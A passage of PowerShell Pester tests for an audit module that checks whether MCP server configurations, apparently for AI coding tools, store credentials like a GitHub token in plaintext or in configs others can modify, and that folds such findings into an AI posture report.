            credentialsPlaintext = $Plaintext; scanBounds = 'test'
        }
    }
    function global:New-TestMcpServer {
        param([string]$Acl = '', [object[]]$Entries = @(), [string]$Transport = 'stdio')
        [ordered]@{ toolId = 'claude-code'; configPath = '.claude.json'; serverName = 'github'; transport = $Transport
            command = 'npx'; argsSummary = '@x'; endpoint = ''; credentialCount = @($Entries).Count
            credentials = @($Entries); configAclIssue = $Acl }
    }
    BeforeEach { Set-TestDevice 'Insecure' }

    It 'is NotApplicable when no MCP servers are configured' {
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'NotApplicable'
    }
    It 'Fails when a plaintext credential sits in a config others can modify' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Plaintext 1 -Servers @(New-TestMcpServer -Acl '.claude.json is writable by S-1-5-32-545' -Entries @($cred)) }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Fail'
    }
    It 'Warns when a plaintext credential is in a locked-down config' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Plaintext 1 -Servers @(New-TestMcpServer -Acl '' -Entries @($cred)) }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Warn'
    }
    It 'Passes when every credential is a reference' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'unknown'; storage = 'env-var-reference' }
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Plaintext 0 -Servers @(New-TestMcpServer -Entries @($cred)) }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Pass'
    }
    It 'is Manual in a machine context where contents were not read' {
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Servers @(New-TestMcpServer -Transport 'not-read') }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Manual'
    }
}

Describe 'Get-CEAiPosture MCP folding' {
    It 'folds plaintext credentials into deviations and exposes the count and servers' {
        Set-TestDevice 'Insecure'
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            [ordered]@{ mcpConfigsFound = 1; mcpConfigsParsed = 1; mcpConfigsUnreadable = @()
                mcpServers = @([ordered]@{ toolId = 'claude-code'; configPath = '.claude.json'; serverName = 'github'; transport = 'stdio'; command = 'npx'; argsSummary = '@x'; endpoint = ''; credentialCount = 1; credentials = @([ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }); configAclIssue = '' })
                credentialsFound = 1; credentialsPlaintext = 1; scanBounds = 'test' }
        }
        $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
        $ai.credentialsPlaintext | Should -Be 1
        $ai.deviations | Should -BeGreaterOrEqual 1
        $ai.contained | Should -BeFalse
        @($ai.mcpServers).Count | Should -Be 1
    }
}
